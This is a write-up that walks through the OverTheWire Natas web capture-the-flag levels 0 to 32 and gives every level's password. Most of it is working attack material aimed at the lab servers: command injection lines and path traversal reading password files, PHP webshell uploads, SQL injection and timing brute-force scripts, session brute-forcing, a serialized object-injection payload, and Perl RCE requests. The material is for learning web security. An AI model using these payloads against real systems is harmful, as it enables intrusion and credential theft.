# OverTheWire Natas 1 To 34 Full Writeup

### Introduce

This is the walkthrough of all Natas CTF challenges from 1 to 34. (34 is still a placeholder as of 07/05/2020).

Natas is a web application CTF game hosted by [OverTheWire](http://overthewire.org/wargames/natas/).

Entrypoint: [http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org/)  (login with  `natas0:natas0`)

## Natas 0

View source page and find the password.

Password: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

## Natas 1

View source page and find the password.

Password: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

## Natas 2

View source page and find that there’s a folder `/files/` on the web root. Inside this folder there’s a file named as `users.txt`. Open it and find the password.

Password: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

## Natas 3

View source page and find that `Not even Google will find it this time`. It looks like that there’s something to do with the search engines.

Try to open the `/robots.txt` and find that the website disallows the folder `/s3cr3t/` to be crawled. Open the folder and find the password in the file `user.txt`.

Password: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

## Natas 4

Referrer hijacking.

View this page using `Referrer`  (or  `Referer`)  `http://natas5.natas.labs.overthewire.org/` and find the password.

Password: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

## Natas 5

Change cookie `loggedin`  to  `1`, reload the page and find the password.

Password: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

## Natas 6

View source page. Note that the file `includes/secret.inc` is included in the page. Open it and get the secret.

Input the secret and get the password.

Password: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

## Natas 7

Path traversal.

This page doesn’t validate the input `page`, and therefore is vulnerable to path traversal attack.

Remember that the introduction of Natas Wargame says `All passwords are also stored in /etc/natas_webpass/` and named as `/etc/natas_webpass/natasX`. Thus, we can try to set the param  `page` as `/etc/natas_webpass/natas8` and find the password.

**Note: Input `/etc/natas_webpass/natas7` to find the password for this page itself. Other numbers would fail due to privilege limitation.**

Password: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

## Natas 8

View source page and find that `bin2hex(strrev(base64_encode($secret))` produced `3d3d516343746d4d6d6c315669563362`. Reverse these steps to get the secret.

*In PHP, for example, execute `echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));` to get the secret.*

Input the secret and get the password.

Password: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

## Natas 9

Command injection.

The `$key` is the point that could be replaced by our injection code.

Input `; cat /etc/natas_webpass/natas10;` and get the password.

Password: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

## Natas 10

Comparing to `Natas 9`, this challenge filters the key characters to command injection. However, we could take advantage of the  `grep` command to print the password.

Note that the command line `grep -i <word> <file 1> <file 2> ... <file n>` will print every line in each file that contains the. Thus, we could compile such command and go through the 26 letters and their capitalized format to find a ‘matched letter’ to the password.

For this challenge, we could input `c /etc/natas_webpass/natas11` and print the password out.

Password: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

## Natas 11

View source page and find that the `data` stored in our cookie is “encrypted” by xoring with a censored string `$key`. The default original data is json encoded array  `array("showpassword"=>"no", "bgcolor"=>"#ffffff");`.

Thus, we could xor the original string with the encrypted text to get the `$key`:

| 1   2   3   4 | $originalString = json\_encode(array( “showpassword”=>”no”, “bgcolor”=>”#ffffff”));   $cookieString = base64\_decode(‘ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=’);   echo $originalString ^ $cookieString; |
| --- | --- |

The result is `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`, which implies that the `$key`  should be  `qw8J`  (repeated during the  `xor_encrypt` function).

Since we’ve got the `$key`, we can build our own data setting  `showpassword`  to  `yes`:

| 1   2   3   4   5   6   7   8 | $key = ‘qw8J’;   $newString = json\_encode(array( “showpassword”=>”yes”, “bgcolor”=>”#ffffff”));   $cookieData = ”;   for ($i = 0; $i < strlen($newString); $i++) {   $cookieData.= $key\[$i % strlen($key)\] ^ $newString\[$i\];   }   echo base64\_encode($cookieData); |
| --- | --- |

The result is `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`. Alter the  `data` in cookie with this string and reload the page to get the password.

Password: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

## Natas 12

View source page and find that the extension of the file uploaded is extracted from `$_POST["filename"]`. Thus, upon uploading a file, we can set the `filename` as any string ending with `.php`, and upload a php file.

In the php file, we can execute the following code:  
`echo exec("cat /etc/natas_webpass/natas13");`

After we upload the php file, we can open that page and get the password.

Password: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

## Natas 13

View the source page and we can find that this challenge is an upgraded version of `Natas 12`. In this challenge, the EXIF image type is checked, so we need to add a header to our php file and make it look like a JPEG file.

We can create a php file like this:

`\0xFF\0xD8\0xFF\0xE0<?php echo exec('cat /etc/natas_webpass/natas14');?>`

**Note: The JPEG header above contains four characters in HEX format.**

Upload this php using the similar way in `Natas 12` and get the password.

Password: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

## Natas 14

Simple SQL injection.

Set either `username`  or  `password` as `" or 1=1 --` and get the password.

Password: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

## Natas 15

SQL injection.

View source page and find that the `username`  is a SQL injection point. Noticed that the database only consists of  `username`  and  `password`, we can brute force any password existing in the database  **one character at a time**.

The following automated program is a DFS example that works for this challenge:

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16 | import commands      def search(password):   if len(password) <= 32:   words = “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234568790”   for c in words:   newpassword = password + c   sql = ‘curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/index.php\\?debug\\=aa\\&username\\=\\\\\\”%20or%20binary%20password%20like%20\\\\\\”‘ + newpassword + ‘%’   return\_code, output = commands.getstatusoutput(sql)   if output.find(‘exists’) > 0:   print(newpassword)   search(newpassword)      search(”) |
| --- | --- |

**Side note: The username of this password is `natas16`**

Password: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`

## Natas 16

Get all characters except numbers:  
`$(expr substr $(cat /etc/natas_webpass/natas17) 1 1)`  
1.Find the common letter in the result (numbers will get no result)

Get all numbers:  
`a{$(($(expr substr $(cat /etc/natas_webpass/natas17) 1 1)-6))}`  
1.Try to modify “6” to make the result as “aa”. The real number is 8 in this example

Now, natas17:8PS3H0GWBN5RD9S7GMADGQNDKHPKQ9CW

Get the case of the letters:

| 1 | a{$(($(expr index $(expr substr $(grep -i Englishing dictionary.txt) 2 4) $(expr substr $(cat /etc/natas\_webpass/natas17) 21 1))+0))} |
| --- | --- |

1.Modify “21” to be the index of the letter (1 to 32)  
2.Modify “Englishing” to meet the following requirement:  
(1)it must be a single result (there is only one result by searching “Englishing”)  
(2)it contains the letter (the 21st letter of the natas17 is G or g)  
3.Modify “2” to be the previous letter of the target letter (“ngli” to G or g)  
4.Try to modify “0” to “0” or “2” to make the result as “aa”. Then judge if the letter is the right case for the target letter.

Final result: natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

Note:

| 1   2   3 | $(expr substr $(cat /etc/natas\_webpass/natas17) 5 1) #get the 5th letter of the password   a{$((1+1))} #used in grep as a regex, to find the words containing (1+1) times of “a” => “aa”   $(expr index “b” “abc”) #output the index of “b” in “abc” => 2 |
| --- | --- |

Password: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

## Natas 17

MySQL Injection Code:

| 1 | N0tAC0ntent” union select 1,if ((select password from users where CHAR\_LENGTH(password)=32 limit 0,1) like binary “%”,sleep(2),1) — |
| --- | --- |

There’re 4 passwords in table users with length 32 and they’re all different (tested with “DISTINCT”).

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29   30   31   32   33   34   35   36   37   38 | import httplib,datetime   from base64 import b64encode   from urllib import quote      def checkPassword(password):   httpClient = None   try:   sql=’N0tAC0ntent” union select 1,if ((select password from users where CHAR\_LENGTH(password)=32 limit 3,1) like binary “‘+password+’%”,sleep(0.5),1) — ‘ # change “3” from 0-3 to select which password to guess   startDatetime = datetime.datetime.now()   userAndPass = b64encode(b”natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw”).decode(“ascii”)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass }   httpClient = httplib.HTTPConnection(‘natas17.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘GET’, ‘/index.php?debug=a&username=’+quote(sql), headers=headers)   response = httpClient.getresponse()   #print response.read()   endDatetime = datetime.datetime.now()   if int((endDatetime-startDatetime).microseconds) >= 600000: # change “600000” to fit the current latency of network (over 500000 as 0.5s but not too high)   return True   else:   return False   except Exception, e:   print e   finally:   if httpClient:   httpClient.close()      def autocheck(currentpass):   passbook=”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789″   if checkPassword(currentpass):   print currentpass   if len(currentpass)==32:   print “Possible Result:”+currentpass   return   for item in passbook:   autocheck(currentpass+item)      password=””   autocheck(password) |
| --- | --- |

0:0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd (not this one)  
1:MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 (not this one)  
2:VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD (not this one)  
3:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP (Real password)

Password: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`

## Natas 18

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29 | import httplib,sys   from base64 import b64encode      def check(sessid):   httpClient = None   try:   userAndPass = b64encode(b”natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP”).decode(“ascii”)   cookie = ‘PHPSESSID=’+str(sessid)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Cookie’: cookie }   httpClient = httplib.HTTPConnection(‘natas18.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘GET’, ‘/index.php?debug=a’, headers=headers)   response = httpClient.getresponse()   responseData = response.read()   if ‘regular’ in responseData:   print ‘regular ‘+str(sessid)   else:   print responseData   sys.exit()   except Exception, e:   print e   finally:   if httpClient:   httpClient.close()      def autocheck():   for i in range(0,641):   check(i)      autocheck() |
| --- | --- |

The admin sessid is at 138  
Password: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`

## Natas 19

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29   30   31   32   33   34   35   36   37   38   39   40   41   42   43 | import httplib,sys   from base64 import b64encode   from urllib import urlencode      def check(sessid):   httpClient = None   try:   userAndPass = b64encode(b”natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs”).decode(“ascii”)   body=urlencode({‘username’: ‘admin’, ‘password’: ‘aaa’ }) # username must be admin: it will affect how PHPSESSID is generated; password could be any string   cookie = ‘PHPSESSID=’+str(sessid)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’, ‘Cookie’: cookie }   httpClient = httplib.HTTPConnection(‘natas19.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘POST’, ‘/index.php?debug=a’,body=body,headers=headers)   response = httpClient.getresponse()   responseData = response.read()   #print responseData   if ‘regular’ in responseData:   print ‘regular ‘+str(sessid)   else:   print responseData   sys.exit()   except Exception, e:   print e   finally:   if httpClient:   httpClient.close()      def autocheck():   for i in range(0,1000):   a = i/100   b = i/10-a\*10   c = i%10   sessid=”   if not a==0:   sessid+=’3’+str(a)   if not b==0:   sessid+=’3’+str(b)   if not c==0:   sessid+=’3’+str(c)   sessid+=’2d61646d696e’   check(sessid)      autocheck() |
| --- | --- |

The admin sessid is at 38392d61646d696e (089)  
Password: `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`

## Natas 20

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23 | import httplib,sys   from base64 import b64encode   from urllib import urlencode      def check(sessid):   httpClient = None   try:   userAndPass = b64encode(b”natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF”).decode(“ascii”)   body=urlencode({‘name’: ‘whatevername\\nadmin 1’})   cookie = ‘PHPSESSID=’+str(sessid)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’, ‘Cookie’: cookie }   httpClient = httplib.HTTPConnection(‘natas20.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘POST’, ‘/index.php?debug=a’, body=body, headers=headers)   response = httpClient.getresponse()   responseData = response.read()   print responseData   except Exception, e:   print e   finally:   if httpClient:   httpClient.close()      check(‘whateversessid’) |
| --- | --- |

Injection: “whatevername\\nadmin 1” (web browser might not work!)  
Run the program for two times: first time executing mywrite to inject the session, second time executing myread to set admin to 1  
Password: `IFekPyrQXftziDEsUr3x21sYuahypdgJ`

## Natas 21

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29   30   31   32   33   34   35   36   37 | import httplib,sys   from base64 import b64encode   from urllib import urlencode      sessid=’whateversessid’   httpClient = None   try:   userAndPass = b64encode(b”natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ”).decode(“ascii”)   body=urlencode({‘submit’: ‘a’, ‘admin’:’1′})   cookie = ‘PHPSESSID=’+str(sessid)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’, ‘Cookie’: cookie }   httpClient = httplib.HTTPConnection(‘natas21-experimenter.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘POST’, ‘/index.php?debug=a’, body=body, headers=headers)   response = httpClient.getresponse()   responseData = response.read()   print responseData   except Exception, e:   print e   finally:   if httpClient:   httpClient.close()      httpClient = None   try:   userAndPass = b64encode(b”natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ”).decode(“ascii”)   cookie = ‘PHPSESSID=’+str(sessid)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’, ‘Cookie’: cookie }   httpClient = httplib.HTTPConnection(‘natas21.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘GET’, ‘/index.php’, headers=headers)   response = httpClient.getresponse()   responseData = response.read()   print responseData   except Exception, e:   print e   finally:   if httpClient:   httpClient.close() |
| --- | --- |

Two websites are sharing the same session.  
Password: `chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ`

## Natas 22

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20 | import httplib,sys   from base64 import b64encode   from urllib import urlencode      httpClient = None   try:   userAndPass = b64encode(b”natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ”).decode(“ascii”)   #body=urlencode({‘submit’: ‘a’, ‘admin’:’1′})   #cookie = ‘PHPSESSID=’+str(sessid)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’ }#, ‘Cookie’: cookie }   httpClient = httplib.HTTPConnection(‘natas22.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘GET’, ‘/index.php?revelio=a’, headers=headers)   response = httpClient.getresponse()   responseData = response.read()   print responseData   except Exception, e:   print e   finally:   if httpClient:   httpClient.close() |
| --- | --- |

The program doesn’t care about what a “Location” is.  
Password: `D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE`

## Natas 23

`11iloveyou`

Password: `OsRmXFguozKpTZZ5X14zNO43379LZveg`

## Natas 24

http://natas24.natas.labs.overthewire.org/?passwd\[\]=1

strcmp returns 0 when comparing an array with a string and result in exception  
Password: `GHF6X7YwACaYYssHVY05cFq83hRktl4c`

## Natas 25

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21 | import httplib,sys   from base64 import b64encode   from urllib import urlencode      sessid=’whateversessid’   langstr=’….//….//….//….//….//var/www/natas/natas25/logs/natas25\_whateversessid.log’   httpClient = None   try:   userAndPass = b64encode(b”natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c”).decode(“ascii”)   cookie = ‘PHPSESSID=’+str(sessid)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’, ‘Cookie’: cookie, ‘User-Agent’: ‘’}   httpClient = httplib.HTTPConnection(‘natas25.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘GET’, ‘/index.php?lang=’+langstr, headers=headers)   response = httpClient.getresponse()   responseData = response.read()   print responseData   except Exception, e:   print e   finally:   if httpClient:   httpClient.close() |
| --- | --- |

“….//” becomes “../” after the first filter  
The second filter cannot be passed  
Make use of User-Agent to execute code

Password: `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`

## Natas 26

PHP Object Injection  
Build a php and execute:

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15 | class Logger{   private $logFile;   private $initMsg;   private $exitMsg;   function \_\_construct(){   // initialise variables   $this->initMsg=”#–session started–#\\n”;   $this->exitMsg=””;   $this->logFile = “img/output.php”;   }   }   $output\[\]=new Logger();   echo base64\_encode(serialize($output));   ?> |
| --- | --- |

Note: try to make the output base64\_encoded string clean from “=”, otherwise it may not be accepted

Output String:  
YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL3doYXRpc2l0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDY6Ijw/cGhwIGluY2x1ZGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO319

Then send this string as “drawing” in the Cookie. It would be unserialized by the server and regarded as a Logger. On destruct function (automatically executed), it will write a php to show the password file.

Password: `55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ`

## Natas 27

Two solutions:

1. Keep inserting data with username “natas28” and a password, as the database is cleared in 5 minutes, the insertion would succeed by chance. Then query with the username and password to get the real password.
2. (Better way) Insert data with username (“natas28” + more than 64-7 times of space + “whatever”), and a password. Then query with “natas28” and the password. Then find the real password. (Source: [http://r4stl1n.github.io/2014/12/30/OverTheWire-Natas25-28.html](http://r4stl1n.github.io/2014/12/30/OverTheWire-Natas25-28.html))

Password: `JWwR438wkgTsNKBbcJoowyysdM82YjeF`

## Natas 28

Chosen-plaintext attack in AES-ECB mode and SQL injection

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29   30   31   32   33   34   35   36   37   38   39   40   41   42   43   44   45   46   47   48   49   50   51 | import httplib,sys,binascii   from base64 import b64encode,b64decode   from urllib import quote,unquote      def check(query):   query=quote(query)   httpClient = None   try:   userAndPass = b64encode(b”natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF”).decode(“ascii”)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’}   httpClient = httplib.HTTPConnection(‘natas28.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘GET’, ‘/index.php?query=’+query, headers=headers)   response = httpClient.getresponse()   #responseData = response.read()   result = response.getheader(‘Location’)   return binascii.b2a\_hex(b64decode(unquote(result\[result.find(‘query=’)+6:\])))   except Exception, e:   print e   finally:   if httpClient:   httpClient.close()      def outputhex(str):   i=0   newStr=”   for c in str:   i+=1   if i%32==0:   newStr+=c+’ ‘   else:   newStr+=c   print newStr      def xorInside(str1,str2):   first=str1.decode(‘hex’)   second=str2.decode(‘hex’)   newStr=”   for i in range(0,16):   newStr+= chr(ord(first\[i\])^ord(second\[i\]))   return binascii.b2a\_hex(newStr)      def autocheck():   a=”   b=”   for i in range(1,80):   a+=’a’   b+=’b’   outputhex(check(a))   outputhex(check(b))      autocheck() |
| --- | --- |

Query process:

1. Message = Escape(Original\_input)
2. Message\_to\_encrypt = Prefix\[38\] | Message | Suffix\[30\] | Padding(PKCS#7?)
3. Encrypted\_message = AES-ECB(Message\_to\_encrypt)
4. Message\_to\_send = Base\_64(Encrypted\_message)
5. [http://natas28.natas.labs.overthewire.org/search.php/index.php?query=Message\_to\_send](http://natas28.natas.labs.overthewire.org/search.php/index.php?query=Message_to_send)

| 1   2   3   4   5   6   7   8   9 | How to get a “‘ or 1=1 — “:   1\. query “aaaaaaaaaa”+”x or 1=1 — bbbb”+”aa” (a,b and x can be any normal char)   1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 c0872dee8bc90b1156913b08a223a39e 2915fe89fae53f38df4c947acd65adde ce82a9553b65b81280fb6d3bf2900f47 75fd5044fd063d26f6bb7f734b41c899   2\. query “aaaaaaaaa” +”‘ or 1=1 — bbbb”+”aa”   1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 11dbb80ae02425dc9726bffd1803160e 42094fd365d8e79ba6bbbe58b962416b ce82a9553b65b81280fb6d3bf2900f47 75fd5044fd063d26f6bb7f734b41c899   since ‘ is replaced to \\’, I removed one “a” in the left string to make the \\ be in the same group of the nine “a”. The new message is   Prefix\[32\] \| Prefix\[6\] + “aaaaaaaaa” + “\\” \| “‘ or 1=1 — bbbb” \| “aa” + Suffix\[30\] (No padding because the last group is full)   As a result, the encryption of “‘ or 1=1 — bbbb” is 42094fd365d8e79ba6bbbe58b962416b   3\. place it as the fourth group in the first query instead of the previous one, base64 the result and send it |
| --- | --- | --- | --- | --- |

Let’s move on:

| 1   2   3   4 | 1\. try “‘ union select 1 from users — ” (“aaaaaaaaa”+”‘ union select 1″+” from users — b”+”bbbbbbbbbbbbbbbb”+”aa”)   return 1, which means that the table “users” exists   2\. try “‘ union select password from users — ” (“aaaaaaaaa”+”‘ union select p”+”assword from use”+”rs — bbbbbbbbbb”+”aa”)   got the password! |
| --- | --- |

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27   28   29   30   31   32   33   34   35   36   37   38   39   40   41   42   43   44   45   46   47   48   49   50   51   52   53   54   55   56   57   58   59   60   61   62   63   64   65   66   67   68   69 | import httplib,sys,binascii   from base64 import b64encode,b64decode   from urllib import quote,unquote      def check(query):   query=quote(query)   httpClient = None   try:   userAndPass = b64encode(b”natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF”).decode(“ascii”)   headers = { ‘Authorization’: ‘Basic %s’ % userAndPass, ‘Content-Type’: ‘application/x-www-form-urlencoded’}   httpClient = httplib.HTTPConnection(‘natas28.natas.labs.overthewire.org’, 80, timeout=300)   httpClient.request(‘GET’, ‘/index.php?query=’+query, headers=headers)   response = httpClient.getresponse()   #responseData = response.read()   result = response.getheader(‘Location’)   return binascii.b2a\_hex(b64decode(unquote(result\[result.find(‘query=’)+6:\])))   except Exception, e:   print e   finally:   if httpClient:   httpClient.close()      def outputhex(str):   i=0   newStr=”   for c in str:   i+=1   if i%32==0:   newStr+=c+’ ‘   else:   newStr+=c   print newStr   print “   ”      def xorInside(str1,str2):   first=str1.decode(‘hex’)   second=str2.decode(‘hex’)   newStr=”   for i in range(0,16):   newStr+= chr(ord(first\[i\])^ord(second\[i\]))   return binascii.b2a\_hex(newStr)      def autocheck():   a=”   b=”   for i in range(1,80):   a+=’a’   b+=’b’   outputhex(check(a))   outputhex(check(b))      #sql=”aaaaaaaaa”+”‘ or 1=1 — bbbb”+”bbbbbbbbbbbbbbbb”+”bbbbbbbbbbbbbbbb”+”aa”   #sql= “aaaaaaaaa”+”‘ union select 1″+” from users — b”+”bbbbbbbbbbbbbbbb”+”aa”   sql= “aaaaaaaaa”+”‘ union select p”+”assword from use”+”rs — bbbbbbbbbb”+”aa”      print binascii.b2a\_hex(sql)   outputhex(check(sql))      sqlinj=check(sql)   sqlinj =’1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e’      #sqlinj+=’42094fd365d8e79ba6bbbe58b962416b’+’88a7bd72cda247dae1c3219f054b2e60’+’88a7bd72cda247dae1c3219f054b2e60′   #sqlinj+=’9ae5ffe4df58364079bd3029586df0d6’+’2730431c345fce894d727ac6b56a6762’+’88a7bd72cda247dae1c3219f054b2e60′   sqlinj+= ‘f89dd8dbec15c6a6d9993a3dc7b7a308’+’86951754f7ad56454eb5d5b6768ee646’+’b65a5da3890587484e1107767874df16’      sqlinj+=’ce82a9553b65b81280fb6d3bf2900f4775fd5044fd063d26f6bb7f734b41c899′   print quote(b64encode(sqlinj.decode(‘hex’)))      #autocheck() |
| --- | --- |

Password: `airooCaiseiyee8he8xongien9euhe8b`

## Natas 29

Perl RCE via `open()`. **Note this is not a traditional command injection.**

In perl `open()` function, the filename can be interpreted as a command. The pipe character `|` can be used to “trigger” this mode. [Reference](https://perldoc.perl.org/functions/open.html).

The `file` parameter in this page can be injected and we can get RCE using stuff like `|id%00` or `|id%26%26false%26%26`.

Note that the string `natas` will be sanitized by this page, so we need to use some tweaks here. One possible solution:

| 1 | http://natas29.natas.labs.overthewire.org/index.pl?file=\|cat /etc/na“tas\_webpass/na“tas30%00 |
| --- | --- | --- |

Password: `wie9iexae0Daihohv8vuu3cei9wahf0e`

## Natas 30

SQL injection via `quote()` with list argument

As [this](https://stackoverflow.com/a/40275686)  and  [this](https://security.stackexchange.com/a/175872)  said, the  `quote()` takes list argument and parse the second item as an option parameter to indicate the type of first item. If the type is non-string, it will return the value of first without any quoting. With the help of CGI that passes two URL parameters as a list argument, we can put the injection string as the first parameter and `4`  (to indicate the type as  `SQL_INTEGER`  as the second parameter. [SQL DATA TYPE CODES](http://code.activestate.com/lists/perl-dbi-dev/472/)

An example of POST request body that works:

| 1 | username=abcd&password=’abcd’ or 1=1&password=2 |
| --- | --- |

*(2 refers to `SQL_NUMERIC`)*

Password: `hay7aecuungiuKaezuathuk9biin0pu1`

## Natas 31

Perl CGI `upload()`, `param()` and `<>` issues.

Literally described in [The Perl Jam 2](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf), page 21 – 31.

Copy of this PDF is also saved [here](https://www.upbad.com/assets/ThePerlJam2.pdf).

Working POST request:

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26 | POST /index.pl?/etc/natas\_webpass/natas32 HTTP/1.1   Host: natas31.natas.labs.overthewire.org   Content-Length: 348   Cache-Control: max-age=0   Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==   Origin: http://natas31.natas.labs.overthewire.org   Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryFgVNNE987xWnwuo7   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3   Accept-Encoding: gzip, deflate   Accept-Language: en-US,en;q=0.9,und;q=0.8   Connection: close      ——WebKitFormBoundaryFgVNNE987xWnwuo7   Content-Disposition: form-data; name=”file”      ARGV   ——WebKitFormBoundaryFgVNNE987xWnwuo7   Content-Disposition: form-data; name=”file”; filename=”abc”      abcde   ——WebKitFormBoundaryFgVNNE987xWnwuo7   Content-Disposition: form-data; name=”submit”      Upload   ——WebKitFormBoundaryFgVNNE987xWnwuo7– |
| --- | --- |

Password: `no1vohsheCaiv3ieH4em1ahchisainge`

## Natas 32

Very similar to the previous challenge. A little tweak to make it into RCE:

| 1   2   3   4   5   6   7   8   9   10   11   12   13   14   15   16   17   18   19   20   21   22   23   24   25   26   27 | POST /index.pl?\[code\] HTTP/1.1   Host: natas32.natas.labs.overthewire.org   Content-Length: 384   Cache-Control: max-age=0   Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==   Origin: http://natas32.natas.labs.overthewire.org   Content-Type: multipart/form-data; boundary=—-WebKitFormBoundaryRBTu3E1JQ8QW7zwK   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3   Accept-Encoding: gzip, deflate   Accept-Language: en-US,en;q=0.9,und;q=0.8   Connection: close      ——WebKitFormBoundaryRBTu3E1JQ8QW7zwK   Content-Disposition: form-data; name=”file”      ARGV   ——WebKitFormBoundaryRBTu3E1JQ8QW7zwK   Content-Disposition: form-data; name=”file”; filename=”abc”   Content-Type: text/plain      abcde   ——WebKitFormBoundaryRBTu3E1JQ8QW7zwK   Content-Disposition: form-data; name=”submit”      Upload   ——WebKitFormBoundaryRBTu3E1JQ8QW7zwK– |
| --- | --- |

**The `[code]` above should be something like `code%20to%20execute%20|`**

For this challenge, first execute `ls%20.%20|` to find a binary `getpassword` in the same folder. Then execute `./getpassword%20|` to get the password.

